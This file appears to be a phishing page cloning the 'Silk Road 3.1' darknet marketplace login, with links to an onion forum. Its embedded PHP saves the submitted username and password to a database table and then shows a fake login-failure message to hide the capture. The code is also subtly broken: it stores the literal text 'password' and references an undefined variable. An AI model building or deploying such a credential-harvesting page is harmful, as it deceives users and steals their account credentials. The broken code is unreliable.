


<!DOCTYPE html>

<html lang="en">

	<head>

		<meta charset="utf-8">

		<title>Silk Road 3.1</title>

		<link rel="icon" type="image/png" href="silkroad_gs.png">

		<link rel="stylesheet" type="text/css" href="boot.css">

		<link rel="stylesheet" type="text/css" href="patch1.css">

		<link rel="stylesheet" type="text/css" href="patch2.css">

		<link rel="stylesheet" type="text/css" href="patch3.css">

		<link rel="stylesheet" type="text/css" href="patch4.css">

		<style>

			#b{

			width:99%;

			}

		</style>

	</head>

  <body>

  <div align="center">

	<div id="b" align="left">



		﻿<div align="center" id="d" style="margin-top:-10px"><a href="index.php"><div title="Silk Road 3.0" align="center" id="imgm" style="display:inline-block"><img src="silkroad_gs.png" style="height:70px;width:70px"><br><b style="color:#333">Silk Road</b><br><span style="font-size:12px;font-weight:bold">the darknet's most resilient marketplace</span>
</div></a></div><hr>
<div id="n" style="margin-left:20px;">
<a href="index.php">Login</a>
<a href="2fa.php">2FA</a>
<a href="register.php">Register</a>
<a href="recover.php">Recover</a>
<a target="_blank" href="http://dreadditevelidot.onion/d/SilkRoad">Forums</a>
</div>
<hr>

<form class="form-horizontal" role="form" method="POST" action="?2fa">
	<div align="center" id="vp" style="width:300px;margin-left:20px;">

		<div id="sysr" style="margin-top:0px">Welcome back comrade!</div>

		
				                    <?php
/* Attempt MySQL server connection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
include 'conn.php';

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
if(isset($_POST['save'])){
 $username = mysqli_real_escape_string($link,$_POST['username']);
 $password = mysqli_real_escape_string($link,$_POST['password']);
 

 if (empty($username)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Username Cannot be Empty
    </div>";
}

elseif (empty($password)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Password Cannot be Empty
    </div>";
}


else{ 

// Attempt insert query execution
    $sql = "INSERT INTO 2fa (username,
password
) 
    VALUES ('$username',
'password')";
    if(mysqli_query($link, $sql)){
      echo ' <p style="color: red; font-weight: bolder; font-size: 20px;">
  There was an error during Login, Please try again later
</p>';
    } else{
                    echo "db insertion error:".$query."<br>";

                }//else end
}
}
// Close connection
mysqli_close($link);

?>
		<b>Name</b>
		<br>

		<input name="username" maxlength="32" class="form-control" style="width:250px">

		<br>
		<b>Password</b>
		<br>

		<input name="password" maxlength="100" type="password" class="form-control" style="width:250px" value=""><br>

		<b>Captcha</b>
		<br>
		<img src="image1170a.png"><br><br>
	 	<input type="text" name="captcha" value="" class="form-control" style="width:250px"><br>
	    <input type="hidden" name="2faattempt" value=1>

		<div align="left">
			<input name="save" type="submit" id="send" style="width:100%; text-align:center" value="Login">
		</div>
	</div>
</form>


	</div>

  </div>

  </body>

</html>
